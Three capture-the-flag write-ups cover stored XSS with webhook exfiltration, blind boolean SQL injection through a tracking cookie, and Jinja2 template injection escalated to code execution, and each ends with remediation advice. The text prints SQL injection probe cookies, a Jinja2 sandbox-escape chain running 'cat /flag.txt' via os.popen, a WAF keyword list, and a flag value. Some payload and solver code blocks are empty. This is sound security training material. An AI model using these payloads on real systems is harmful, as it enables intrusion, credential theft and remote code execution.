# Technical Write-Up: The Blog (Stored XSS & Context Exfiltration)

## Challenge Specification

- **Target Application**: Standard blogging engine with articles and a public contact submission form (`/contact`).
- **Simulated Environment**: An editorial bot with authenticated administrative privileges periodically navigates to the inbox in a real browser instance and opens unread messages.
- **Flag Format**: `InvataCyber{...}`

## Attack Surface Analysis & Root Cause

The application exposes two primary components:
1. **Public Ingress**: Contact submission form at `/contact` accepting `name`, `email`, and `message` via HTTP POST.
2. **Privileged Background Bot**: A headless browser (Puppeteer / Chromium) operating with active session cookies on the internal `/admin` route.

### Vulnerability Mechanism

The server stores incoming messages in its database without applying contextual HTML entity encoding (e.g.

Even if session cookies are protected with the `HttpOnly` flag (preventing direct `document.cookie` theft), the bot executes in an authenticated browser state.

## Exploit Payload Engineering

The payload executes in three sequential stages:
1. Issues an asynchronous `fetch()` request to `/admin`.
2. Converts the response stream to raw text.
3. Transmits the response text (containing the flag) to an external webhook.

Wrapped in a `<script>` tag for injection into the `message` field:

## Automated Python Solver (`solver.py`)

## Remediation & Hardening Recommendations

1. **Context-Aware Output Encoding**: Ensure all user-supplied input rendered in HTML templates is encoded (e.g. using Jinja2 automatic escaping or React DOM bindings).
2. **Content Security Policy (CSP)**: Deploy strict CSP headers forbidding unauthorized inline scripts and restricting outbound network connections:
```http Content-Security-Policy: default-src 'self'; script-src 'nonce-<RANDOM>'; connect-src 'self'; ```
3. **DOMPurify Sanitization**: If rich-text HTML rendering is required, sanitize markup using DOMPurify before DOM insertion.


# Technical Write-Up: Portal InvataCyber.ro (Blind SQL Injection & Admin Takeover)

## Challenge Specification

- **Target Application**: Maintenance / lockdown portal with authentication modules hidden from the public interface.
- **Tracking Mechanism**: The application sets and reads a tracking cookie (`TrackingId`) to identify returning visitors. When the cookie value matches an active database record, a unique banner is displayed; when it does not match, a di...
- **Objective**: Discover the hidden administrative console and recover credentials to extract the flag.
- **Flag Format**: `InvataCyber{...}`

## Attack Surface Analysis & Root Cause

Upon inspecting HTTP traffic, the web server reads the `TrackingId` cookie:

The application queries the database backend:

When this query returns a valid record, the application includes a welcome message in the response body, producing an exact response length of **5,652 bytes**.

Because data is not directly reflected in page content and no database error traces are displayed, this behavior creates an ideal **Blind Boolean-Based SQL Injection Oracle**.

## Vulnerability Verification (PoC Oracle)

Testing boolean conditional logic using [`sql_solve.py`](scripts/sql_solve.py):

* **Condition True**:
```http Cookie: TrackingId=base-tracking-id-123' OR '1'='1 ``` Result: Response size is `5652 bytes` (banner present).

* **Condition False**:
```http Cookie: TrackingId=base-tracking-id-123' OR '1'='2 ``` Result: Response size is not `5652 bytes` (banner absent).

This confirms the presence of an injectable SQLite database backend.

## Automated Database Schema & Credential Exfiltration

Using automated Python scripts ([`dump_sqlite.py`](scripts/dump_sqlite.py), [`dump_schema.py`](scripts/dump_schema.py), and [`dump_users.py`](scripts/dump_users.py)), binary-search character extraction was executed against `sqlite_master` and internal tables.

### Schema Extraction Query

Recovered Table DDL:

### Credential Dumping Query

Recovered Credentials:
- **Username**: `admin`
- **Password**: `<extracted_cleartext_password>`

## Administrative Console Discovery & Flag Capture

Executing the endpoint scanner [`solver_portal.py`](scripts/solver_portal.py) revealed the hidden administrative route:
- Route: `/console`
- Authenticating with recovered credentials yielded full administrative access and revealed the flag:
`InvataCyber{b1ind_sq1i_d4t4b4s3_3xfi1tr4t10n_succ3ss}`

## Remediation & Hardening Recommendations

1. **Parameterized Prepared Statements**: Replace dynamic string concatenation with parameterized SQL queries:
```python cursor.execute("SELECT tracking_id FROM tracking WHERE tracking_id = ?", (cookie_val,)) ```
2. **Web Application Firewall (WAF)**: Deploy Suricata / ModSecurity rules detecting SQL injection metacharacters (`'`, `OR`, `SELECT`, `sqlite_master`) in HTTP headers.
3. **Cookie Validation**: Enforce strict cryptographic HMAC signing on tracking cookies to prevent client-side manipulation.

# Technical Write-Up: CMS Newsroom (Broken Access Control & Jinja2 SSTI to RCE)

## Challenge Specification

- **Target Application**: Newly migrated newsroom content management system (CMS).
- **Flaw Context**: Single Sign-On (SSO) authentication middleware was erroneously omitted from editorial management routes, allowing unauthenticated visitors to create and edit articles. Article content is evaluated by the server before...
- **Flag Location**: `/flag.txt`
- **Flag Format**: `InvataCyber{...}`

## Attack Surface Analysis & Root Cause

The challenge presents two chained vulnerabilities:

1. **Broken Access Control ([CWE-306](https://cwe.mitre.org/data/definitions/306.html))**:  
The editorial routes (`/edit/<id>`, `/new-post`) lack authentication decorators.
2. **Server-Side Template Injection ([CWE-1336](https://cwe.mitre.org/data/definitions/1336.html))**:  
The backend improperly utilizes `render_template_string()` in Python Flask/Jinja2, concatenating user-controlled article content directly into the template string rather than passing it as a template context variable.

## Template Engine Fingerprinting

Submitting mathematical expression payloads into article content via `POST /edit/5`:
- **Initial Probe**: `{{ 7 * 7 }}`  
Viewing `GET /post/5` rendered: ```html <div class="post-content">49</div> ```
- **String Multiplication Probe**: `{{ 'a' * 3 }}`  
Rendered output: `aaa`.

This confirmed an active **Jinja2 / Python** templating engine without sandbox isolation.

## Sandbox Escape & Remote Code Execution (RCE)

In Jinja2 on Python 3, access to underlying Python objects is achievable via the method resolution order (`__mro__`):

1. Access base class:
```jinja2 {{ ''.__class__.__mro__[1] }} ```
2. Inspect available subclasses:
```jinja2 {{ ''.__class__.__mro__[1].__subclasses__() }} ```
3. Locate `subprocess.Popen` or `os.system` execution primitives to read `/flag.txt`:
```jinja2 {{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }} ```

## Automated Python Solver (`blog_flag.py`)

## Remediation & Hardening Recommendations

1. **Enforce Authentication Middleware**: Apply mandatory SSO/OAuth2-Proxy authentication wrappers across all administrative and editorial routes.
2. **Eliminate `render_template_string`**: Use static templates with explicit context parameter binding:
```python # SECURE: Pass content as variable, avoiding template code compilation return render_template('post.html', content=article.content) ```
3. **Sandboxed Template Execution**: If dynamic template rendering is required, utilize Jinja2 `SandboxedEnvironment` to restrict access to dangerous private attributes (`__class__`, `__mro__`, `__globals__`).
